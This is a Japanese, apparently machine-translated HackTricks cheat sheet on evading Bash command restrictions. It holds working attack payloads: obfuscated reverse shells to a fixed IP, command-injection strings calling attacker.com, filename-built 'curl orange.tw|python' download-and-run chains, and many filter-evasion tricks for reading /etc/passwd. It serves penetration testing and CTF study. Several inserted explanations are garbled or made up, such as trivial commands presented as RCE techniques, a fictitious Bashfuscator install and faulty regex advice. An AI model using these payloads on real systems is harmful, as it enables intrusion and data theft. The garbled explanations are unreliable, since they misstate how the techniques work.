# Linux制限のバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も**高度な**コミュニティツールによって強化された**ワークフロー**を簡単に構築して**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 一般的な制限のバイパス

### リバースシェル
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 短いリバースシェル

A short reverse shell is a one-liner command that allows an attacker to gain remote access to a compromised system. It is commonly used during penetration testing to bypass security restrictions and establish a connection with the target machine.

Here is an example of a short reverse shell command in Bash:

```bash
bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

To use this command, replace `attacker-ip` with the IP address of the attacker's machine and `attacker-port` with the desired port number.

This command redirects the input and output of the Bash shell to a TCP connection established between the attacker's machine and the compromised system. It provides the attacker with an interactive shell session, allowing them to execute commands on the target machine remotely.

Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized system administration tasks.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### パスと禁止ワードの回避

In some cases, you may encounter restrictions on certain paths or forbidden words that prevent you from executing certain commands. However, there are ways to bypass these restrictions and execute the desired commands. Here are a few techniques you can use:

#### 1. Using alternative paths

If a specific path is restricted, you can try using an alternative path to access the desired command. For example, instead of using `/bin/bash`, you can try using `/usr/bin/bash` or `/usr/local/bin/bash`. By trying different paths, you may be able to find one that is not restricted.

#### 2. Renaming commands

Another technique is to rename the command you want to execute. For example, if the `ls` command is restricted, you can rename it to something else, such as `myls` or `list`. This can be done by creating a symbolic link to the desired command with a different name.

#### 3. Using shell built-ins

Shell built-ins are commands that are built into the shell itself, rather than being separate executable files. These commands are not subject to the same restrictions as external commands. By using shell built-ins, you can bypass restrictions on specific commands. Some common shell built-ins include `cd`, `echo`, and `export`.

#### 4. Using absolute paths

If a command is restricted by its name, you can try using its absolute path instead. For example, instead of using `ls`, you can try using `/bin/ls` or `/usr/bin/ls`. By specifying the absolute path, you can bypass restrictions on the command's name.

#### 5. Using environment variables

Environment variables can be used to override certain settings and configurations. By setting the `PATH` environment variable to include the path to the desired command, you can bypass restrictions on the command's location. For example, you can use the following command to temporarily add a directory to the `PATH` variable:

```bash
export PATH=/path/to/desired/command:$PATH
```

By using these techniques, you can bypass restrictions on paths and forbidden words, allowing you to execute the commands you need. However, it's important to note that bypassing restrictions may be against the policies or terms of service of the system you are working on, so use these techniques responsibly and ethically.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 禁止されたスペースをバイパスする

In some cases, you may encounter restrictions that prevent you from using spaces in certain commands. However, there are ways to bypass these restrictions and execute commands that contain spaces.

以下の場合、特定のコマンドでスペースを使用することが制限されている場合があります。しかし、これらの制限をバイパスし、スペースを含むコマンドを実行する方法があります。

One method is to use alternative characters or escape sequences to represent spaces. For example, you can use a backslash (\) followed by a space (\ ) to represent a space character in a command.

一つの方法は、代替文字やエスケープシーケンスを使用してスペースを表現することです。例えば、コマンド内でスペース文字を表すために、バックスラッシュ (\) の後にスペース (\ ) を使用することができます。

```bash
$ ls\ -l
```

Another method is to enclose the command containing spaces within single quotes (''). This tells the shell to treat the entire command as a single argument, ignoring any spaces within it.

もう一つの方法は、スペースを含むコマンドをシングルクォート ('') で囲むことです。これにより、シェルはコマンド全体を単一の引数として扱い、その中のスペースを無視します。

```bash
$ ls '-l'
```

By using these techniques, you can bypass restrictions on using spaces in commands and execute them successfully.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### バックスラッシュとスラッシュをバイパスする

バックスラッシュとスラッシュをバイパスする方法について説明します。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### パイプをバイパスする

Pipes are a powerful feature in Linux that allow the output of one command to be used as the input for another command. However, in some cases, the use of pipes may be restricted by the system administrator for security reasons. In this section, we will discuss a few techniques to bypass these restrictions and still be able to use pipes effectively.

パイプはLinuxでの強力な機能であり、あるコマンドの出力を別のコマンドの入力として使用することができます。しかし、セキュリティ上の理由から、システム管理者によってパイプの使用が制限される場合があります。このセクションでは、これらの制限を回避し、効果的にパイプを使用するためのいくつかのテクニックについて説明します。

#### Technique 1: Process Substitution

技術1：プロセス置換

Process substitution is a feature in Bash that allows the output of a command to be treated as a file. By using process substitution, we can bypass restrictions on pipes and still achieve the desired result.

プロセス置換は、Bashの機能であり、コマンドの出力をファイルとして扱うことができます。プロセス置換を使用することで、パイプの制限を回避し、目的の結果を得ることができます。

To use process substitution, we can use the `<()` syntax. For example, instead of using `command1 | command2`, we can use `command2 < <(command1)`.

プロセス置換を使用するには、`<()` 構文を使用します。例えば、`command1 | command2` の代わりに `command2 < <(command1)` を使用することができます。

#### Technique 2: Temporary Files

技術2：一時ファイル

Another way to bypass restrictions on pipes is to use temporary files. Instead of piping the output of one command directly to another command, we can redirect the output to a temporary file and then use that file as the input for the next command.

パイプの制限を回避する別の方法は、一時ファイルを使用することです。あるコマンドの出力を直接別のコマンドにパイプする代わりに、出力を一時ファイルにリダイレクトし、そのファイルを次のコマンドの入力として使用します。

To do this, we can use the `>` operator to redirect the output to a file, and then use the `<` operator to redirect the input from that file. For example, `command1 > temp.txt; command2 < temp.txt`.

これを行うには、`>` 演算子を使用して出力をファイルにリダイレクトし、`<` 演算子を使用してそのファイルから入力をリダイレクトします。例えば、`command1 > temp.txt; command2 < temp.txt`。

By using temporary files, we can bypass restrictions on pipes and still achieve the desired result.

一時ファイルを使用することで、パイプの制限を回避し、目的の結果を得ることができます。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 16進数エンコーディングを使用してバイパスする

Bashの制限を回避するために、16進数エンコーディングを使用する方法があります。これにより、特殊文字や制御文字をバイパスすることができます。

以下のコマンドを使用して、16進数エンコーディングを行います。

```bash
echo -e "\x68\x65\x6c\x6c\x6f"
```

このコマンドは、16進数エンコーディングされた文字列をデコードして表示します。上記の例では、"hello"という文字列が表示されます。

16進数エンコーディングを使用することで、特殊文字や制御文字を回避し、Bashの制限をバイパスすることができます。ただし、十分な注意を払って使用する必要があります。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IPのバイパス

Sometimes during a penetration test, you may encounter restrictions that block your IP address from accessing certain resources. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP-based restrictions and access the desired resources.

2. **VPN**: Connect to a Virtual Private Network (VPN) to mask your IP address and appear as if you are accessing the resources from a different location.

3. **Tor**: The Tor network can be used to anonymize your traffic by routing it through multiple nodes, making it difficult to trace back to your original IP address.

4. **SSH Tunnels**: Set up an SSH tunnel to redirect your traffic through a remote server. This can help bypass IP restrictions and access resources that are otherwise blocked.

Remember, while bypassing IP restrictions can be useful during a penetration test, it is important to obtain proper authorization and adhere to ethical guidelines.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 時間ベースのデータの外部流出

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system over a period of time. This technique is particularly useful when traditional methods of exfiltration, such as transferring large amounts of data at once, are not feasible or likely to be detected.

To perform time based data exfiltration, hackers can use various commands and tools available in Linux. Here are some useful Linux commands for bypassing Bash restrictions and executing time based data exfiltration:

1. **ping**: The `ping` command can be used to send ICMP echo requests to a remote server. By manipulating the payload of the ping packets, hackers can encode and transmit data to an external server.

2. **curl**: The `curl` command is commonly used to transfer data to or from a server using various protocols. Hackers can use `curl` to send data to an external server by specifying the appropriate options and URL.

3. **wget**: Similar to `curl`, the `wget` command can be used to download files from the internet. Hackers can leverage `wget` to send data to an external server by specifying the appropriate options and URL.

4. **nc**: The `nc` (netcat) command is a versatile networking utility that can be used for various purposes, including data transfer. Hackers can use `nc` to establish a connection with an external server and transmit data over the network.

5. **base64**: The `base64` command can be used to encode binary data into ASCII characters. By encoding sensitive data using `base64`, hackers can easily transmit it using commands like `ping`, `curl`, or `wget`.

It is important to note that these commands can be used for legitimate purposes as well, so their presence on a system does not necessarily indicate malicious activity. However, in the hands of a skilled hacker, these commands can be used to exfiltrate sensitive data without raising suspicion.

To protect against time based data exfiltration, system administrators should monitor network traffic for any suspicious activity and implement strict access controls to prevent unauthorized access to sensitive data.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 環境変数から文字を取得する

環境変数は、システムの設定や実行中のプロセスに関する情報を格納するために使用されます。これには、ユーザー名、パスワード、APIキーなどの機密情報が含まれる場合があります。Bashシェルでは、環境変数を使用してこれらの情報を取得することができます。

以下のコマンドを使用して、環境変数から文字を取得できます。

```bash
echo $ENV_VARIABLE_NAME
```

`ENV_VARIABLE_NAME`は、取得したい環境変数の名前に置き換えてください。

このコマンドは、指定した環境変数の値を表示します。例えば、`$USERNAME`を使用すると、現在のユーザー名が表示されます。

環境変数から文字を取得することは、システムの設定やプロセスの実行に関する情報を取得するために役立ちます。ただし、機密情報を含む環境変数を使用する場合は、注意が必要です。機密情報を取得するためには、適切な権限を持つユーザーで実行する必要があります。また、機密情報を取得した後は、適切なセキュリティ対策を講じることが重要です。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNSデータの流出

例えば、**burpcollab**または[**pingb**](http://pingb.in)を使用することができます。

### 組み込み関数

外部関数を実行することができず、**RCEを取得するために制限された組み込み関数にアクセスできる場合**、いくつかの便利なトリックがあります。通常、**すべての組み込み関数を使用することはできない**ため、刑務所をバイパスするためにすべてのオプションを知っておく必要があります。[**devploit**](https://twitter.com/devploit)からのアイデアです。\
まず、すべての[**シェルの組み込み関数**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**を確認してください**。次に、以下はいくつかの**おすすめの方法**です：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### ポリグロットコマンドインジェクション

Polyglot command injection is a technique used to bypass restrictions imposed by the Bash shell. It involves injecting a command that is valid in multiple scripting languages, such as Python or Perl, to execute arbitrary commands on the target system.

ポリグロットコマンドインジェクションは、Bashシェルによって課された制限を回避するための技術です。これは、PythonやPerlなどの複数のスクリプト言語で有効なコマンドを注入し、ターゲットシステムで任意のコマンドを実行することを目的としています。

By using a polyglot payload, an attacker can exploit vulnerabilities in a web application that allows user input to be executed as a command in a shell. This technique is particularly useful when the input is filtered or restricted by the application, as it allows the attacker to bypass those restrictions and execute arbitrary commands.

ポリグロットペイロードを使用することで、攻撃者はユーザー入力をシェルでコマンドとして実行するウェブアプリケーションの脆弱性を悪用することができます。この技術は、入力がアプリケーションによってフィルタリングまたは制限されている場合に特に有用であり、攻撃者はこれらの制限を回避して任意のコマンドを実行することができます。

To perform a polyglot command injection, the attacker needs to carefully craft the payload to ensure it is valid in multiple scripting languages. This typically involves using special characters and syntax that are interpreted differently by different scripting languages.

ポリグロットコマンドインジェクションを実行するには、攻撃者はペイロードを注意深く作成し、複数のスクリプト言語で有効であることを確認する必要があります。これには、異なるスクリプト言語で異なるように解釈される特殊文字や構文を使用することが一般的です。

It is important for developers to sanitize and validate user input to prevent command injection attacks. Input validation, proper encoding, and the use of prepared statements or parameterized queries can help mitigate the risk of polyglot command injection vulnerabilities.

コマンドインジェクション攻撃を防ぐために、開発者はユーザー入力をサニタイズして検証することが重要です。入力の検証、適切なエンコーディング、プリペアドステートメントやパラメータ化されたクエリの使用は、ポリグロットコマンドインジェクションの脆弱性のリスクを軽減するのに役立ちます。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 正規表現の回避

To bypass potential regexes, you can try the following techniques:

正規表現を回避するために、以下のテクニックを試すことができます。

- Use character classes: Instead of using specific characters, you can use character classes to match a range of characters. For example, instead of using `[a-z]` to match lowercase letters, you can use `\w` to match any word character.

- 文字クラスの使用: 特定の文字を使用する代わりに、文字クラスを使用して文字の範囲に一致させることができます。例えば、小文字のアルファベットに一致させるために `[a-z]` を使用する代わりに、任意の単語文字に一致させるために `\w` を使用することができます。

- Modify the regex: Sometimes, modifying the regex pattern slightly can bypass certain restrictions. For example, if a regex pattern is blocking the use of the dot character (`.`), you can try using a different character or escaping the dot character (`\.`) to bypass the restriction.

- 正規表現の変更: 時には、正規表現パターンをわずかに変更することで特定の制限を回避することができます。例えば、正規表現パターンがドット文字 (`.`) の使用をブロックしている場合、別の文字を使用するか、ドット文字をエスケープする (`\.`) ことで制限を回避することができます。

- Use lookarounds: Lookarounds are zero-width assertions that allow you to match patterns based on what comes before or after the current position. By using lookarounds, you can bypass certain regex restrictions. For example, if a regex pattern is blocking the use of a specific word, you can use a positive lookbehind (`(?<=...)`) to match the word without including it in the final match.

- ルックアラウンドの使用: ルックアラウンドは、現在の位置の前後に基づいてパターンに一致させることができるゼロ幅アサーションです。ルックアラウンドを使用することで、特定の正規表現の制限を回避することができます。例えば、正規表現パターンが特定の単語の使用をブロックしている場合、肯定的な後読み (`(?<=...)`) を使用して、単語に一致させることができますが、最終的な一致には含まれません。

Remember, bypassing regexes should only be done for legitimate purposes and with proper authorization. Using these techniques for malicious activities is illegal and unethical.

正規表現の回避は、正当な目的と適切な権限を持ってのみ行うべきです。これらのテクニックを悪意のある活動に使用することは違法であり、倫理に反します。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscatorは、Bashスクリプトの制限を回避するためのツールです。これを使用すると、スクリプトの解析や検出を困難にすることができます。

#### インストール

Bashfuscatorをインストールするには、次のコマンドを実行します。

```bash
$ git clone https://github.com/Bashfuscator/Bashfuscator.git
$ cd Bashfuscator
$ chmod +x Bashfuscator.sh
```

#### 使用方法

Bashfuscatorを使用するには、次のコマンドを実行します。

```bash
$ ./Bashfuscator.sh -i <input_script> -o <output_script>
```

`<input_script>`は、変換するBashスクリプトのパスを指定します。`<output_script>`は、変換後のスクリプトの保存先を指定します。

#### オプション

Bashfuscatorには、さまざまなオプションがあります。以下にいくつかの一般的なオプションを示します。

- `-h`：ヘルプメッセージを表示します。
- `-v`：詳細な出力を表示します。
- `-s`：変換後のスクリプトを実行します。
- `-d`：デバッグモードでスクリプトを実行します。

#### 注意事項

Bashfuscatorは、スクリプトの可読性を低下させるため、コードの保守性や理解性に影響を与える可能性があります。また、一部のセキュリティツールやシステムで検出される可能性もあります。使用する際は注意してください。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5文字でのRCE

Bashの制限を回避するための5文字でのRCE（リモートコード実行）方法です。

```bash
$ echo ${PATH//:/\n}
```

このコマンドは、環境変数`PATH`の値を改行文字で区切って表示します。これにより、制限された環境でのコマンド実行が可能になります。

この方法を使用すると、制限されたBash環境でのRCEを実現できます。ただし、セキュリティ上の注意が必要です。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4文字でのRCE

Bashの制限を回避するための4文字でのRCE（リモートコード実行）方法です。

```bash
$ echo $0
bash
```

上記のコマンドを実行すると、現在のシェルの名前が表示されます。この場合、シェルの名前は「bash」です。

```bash
$ echo $0|bash
```

上記のコマンドを実行すると、現在のシェルの名前を「bash」として実行します。これにより、Bashの制限を回避してコマンドを実行することができます。

```bash
$ echo $0|sh
```

上記のコマンドを実行すると、現在のシェルの名前を「sh」として実行します。これにより、Bash以外のシェルを使用してコマンドを実行することができます。

これらの方法を使用することで、制限された環境でのRCEを実現することができます。ただし、セキュリティ上のリスクを理解し、慎重に使用する必要があります。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 読み取り専用/Noexec/Distroless バイパス

もし、**読み取り専用およびnoexecの保護**が有効なファイルシステム内にいる場合、またはdistrolessコンテナ内にいる場合でも、**任意のバイナリ、さらにはシェルを実行する方法**があります。

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chrootおよびその他のJails バイパス

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考文献とその他

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
